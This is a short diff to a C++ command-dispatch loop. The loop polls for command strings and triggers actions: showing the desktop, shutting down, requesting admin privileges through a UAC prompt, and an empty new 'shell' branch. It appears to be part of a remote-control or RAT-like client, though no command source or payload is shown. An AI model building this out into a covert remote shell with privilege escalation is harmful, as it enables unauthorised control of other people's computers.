@@ -6,6 +6,7 @@
 #include <chrono>
 #include <string>
 #include "../include/core.h"
+#include "../include/command.h"
 
 using namespace std;
 
@@ -62,16 +63,16 @@ void ListenForCommand() {
             exit(0);
         }
         else if (cmd == "wind") {
-            keybd_event(VK_LWIN, 0, 0, 0);
-            keybd_event('D', 0, 0, 0);
-            keybd_event('D', 0, KEYEVENTF_KEYUP, 0);
-            keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0);
+            wind();
         }
         else if (cmd == "shtd") {
             shtd();
         }
         else if (cmd == "UAC") {
             RequestAdminPrivileges();
+        }
+        else if (parseCommand(cmd) == "shell") {
+
         }
 
         this_thread::sleep_for(chrono::seconds(5));
